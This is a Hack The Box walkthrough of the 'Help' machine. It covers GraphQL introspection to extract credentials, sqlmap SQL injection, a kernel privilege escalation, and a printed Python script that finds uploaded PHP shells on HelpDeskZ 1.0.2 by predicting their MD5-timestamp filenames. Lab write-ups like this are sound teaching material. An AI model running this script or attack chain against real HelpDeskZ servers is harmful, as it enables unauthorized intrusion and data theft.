---
layout: post
title: "Help - Hack The Box"
summary: "HelpDeskZ version enumeration via README.md → GraphQL API discovery on port 3000 → GraphQL introspection query + visualization → user credentials extraction from GraphQL query → password cracking → authenticated SQL injection via SQLmap → staff table dump (Administrator credentials) → help user enumeration → HelpDeskZ file upload RCE via timezone-based filename prediction"
---

# Help - Hack The Box

## Enumeration
### Nmap 
Initial Nmap scan revealed HTTP, SSH and Port 3000 (HTTP) was open.

<img width="1016" height="461" alt="00 - nmap" src="https://github.com/user-attachments/assets/108fac95-15e5-442b-bd9b-e30e256aae25" />

### WEB Enumeration
When I visited the website, it forwarded me to help.htb, so I added it to /etc/hosts file.

<img width="558" height="289" alt="01 - helphtb etc hosts" src="https://github.com/user-attachments/assets/77ab0b60-14c1-4980-ab0f-4bd6d26104fc" />

Then applied directory brute forcing and found an endpoint named support. There was a helpdeskz website hosted.

<img width="1435" height="857" alt="02 - helpdeskz" src="https://github.com/user-attachments/assets/05432e96-68db-494b-9980-40ac54648c97" />

I applied some brute forcing to default credentials and could not find anything. Then I applied version-file brute forcing and found README.md which revealed the version of HelpDeskZ.

<img width="1397" height="438" alt="10 - version" src="https://github.com/user-attachments/assets/3b113451-dcdf-469f-942c-f0b550b8c6d7" />

<img width="695" height="222" alt="11 - version" src="https://github.com/user-attachments/assets/f3290211-bc47-48f0-85f9-6a5645a46bdd" />

This version was both vulnerable to Authenticated SQL Injection and Unauthenticated File Upload to RCE. I tried RCE but it did not work.

Later, I visited the website on Port 3000, It showed a message.

<img width="1035" height="205" alt="03 - message" src="https://github.com/user-attachments/assets/f795d2c7-c7fe-4a18-a1af-524817942a79" />

I applied api-endpoints brute force and found out it was a graphql API.

<img width="1380" height="434" alt="04 - api endpoint graphql" src="https://github.com/user-attachments/assets/856e2e04-e22a-4fc9-88a6-81b3c752bf5a" />

Then ran basic graphql queries to understand how the website is working and what is the parameter.

<img width="850" height="213" alt="05 - graphql" src="https://github.com/user-attachments/assets/97d31609-d5e9-4147-943c-44b96789c46c" />

Later, I captured the request with Burp Suite and ran full introspection query.

<img width="1530" height="740" alt="06 - full introspection" src="https://github.com/user-attachments/assets/4f114ee4-7807-4909-8b02-b81998da3388" />

Then using the [graphql-visualizer](http://nathanrandal.com/graphql-visualizer/), I extracted the graphql API map.

<img width="1920" height="984" alt="07 - visualizer" src="https://github.com/user-attachments/assets/1e12c186-f948-48f5-b832-c43c74e78dfd" />

After learning that it includes a record User which includes username and password, I simply queried it and got the password. 

<img width="1308" height="360" alt="08 - got it" src="https://github.com/user-attachments/assets/63ebb058-0e40-4dcb-90a2-796393479ad0" />

Then cracked the password.

<img width="1330" height="493" alt="09 - cracked" src="https://github.com/user-attachments/assets/63a9108d-0e50-4681-a91f-7243049b9668" />

## Exploitation
### 1st Way SQL Injection
This version of HelpDeskZ was vulnerable to authenticated SQL injection. There was an [exploit-db exploit](https://www.exploit-db.com/exploits/41200) but it was not working and it was old. So I red it to understand how exploit works and tested it myself.

<img width="1529" height="620" alt="12 - sqli" src="https://github.com/user-attachments/assets/40e4add1-f292-42b1-b028-3d3a6a0ebf71" />

Then I created an sqlmap command and dumped the whole database. The staff table included Administrator and its password. 

<img width="1562" height="114" alt="13 - sqlmap" src="https://github.com/user-attachments/assets/98a1cd2b-86a6-4125-8ed6-445e9d436eaf" />

Then I tried some usernames such as Administrator, admin, helpme, support, help and help worked. I logged in and got the user flag.

<img width="1034" height="565" alt="14 - user" src="https://github.com/user-attachments/assets/68a98e7e-887c-4bb7-a0bf-cf4785d44ef1" />

### 2nd Way Unauthenticated RCE
After some researched, I found out the RCE was not working because I was not in the same time zone as the target machine. Later I found out [this](https://github.com/JubJubMcGrub/HelpDeskZ-1.0.2-File-Uplaod) repo. And updated the code as below:

```python
import hashlib
import time, calendar
import sys
import requests

print 'HelpDesk v1.0.2 - Unauthenticated shell upload'

if len(sys.argv) < 3:
    print "Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0])
    sys.exit(1)


helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

#Getting the Time from the server
response = requests.head('http://help.htb/support/')
serverTime = response.headers['Date']
#setting the time in Epoch
FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))


for x in range(0,20*60):
    plaintext = fileName + str(currentTime -x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl + md5hash + '.php'
    response = requests.head(url)
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")
```

The main update is getting the Datetime from the http://help.htb/support/ and querying from current time to previous 20 minutes. Running this script worked, and I got remote code execution.

<img width="1291" height="278" alt="18 - gg" src="https://github.com/user-attachments/assets/b2f5c5c8-c9c2-46b6-a23d-da1b0554cdf5" />


## Privilege Escalation
I tried some methods which did not work. Later, I ran linpeas and found out kernel was exploitable.

<img width="1757" height="358" alt="15 - linpeas" src="https://github.com/user-attachments/assets/43af09cb-e084-48a3-a548-4bc42952cad5" />

At first I tried DirtyCow but it did not work. Later, I tried [CVE-2017-16995](https://github.com/senyuuri/cve-2017-16995/tree/master) and got the root. 

<img width="527" height="249" alt="16 - root" src="https://github.com/user-attachments/assets/9c47482e-0aff-4e5e-92d5-92559cf2a08d" />

## Pwned
The machine was fully compromised.

<img width="721" height="694" alt="17 - pwned" src="https://github.com/user-attachments/assets/435d07ff-3036-43e1-af20-75f716ab4f40" />
